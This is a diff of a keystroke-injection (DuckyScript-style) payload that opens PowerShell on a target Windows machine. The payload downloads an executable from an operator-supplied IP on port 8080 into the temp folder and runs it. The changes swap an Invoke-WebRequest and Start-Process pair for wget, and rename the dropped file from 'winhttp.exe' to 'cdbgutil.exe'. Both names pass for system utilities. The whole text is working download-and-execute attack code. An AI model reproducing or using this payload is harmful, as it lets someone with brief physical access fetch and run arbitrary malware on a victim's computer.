@@ -11,16 +11,15 @@ STRING powershell
 ENTER
 DELAY 1000
 
-STRINGLN $TempPath = [System.IO.Path]::Combine($env:TEMP, "winhttp.exe")
-
 REM Fetch File
-STRING Invoke-WebRequest -Uri "http://
+STRINGLN cd $ENV:TEMP
+STRING wget -O cdbgutil.exe http://
 
 REM Wait for IP type
 WAIT_FOR_BUTTON_PRESS
 
-REM finish file
-STRINGLN :8080/windows" -OutFile $TempPath
+REM finish command
+STRINGLN :8080/windows
 
-DELAY 3000
-STRINGLN Start-Process $TempPath
+REM run
+STRINGLN .\cdbgutil.exe
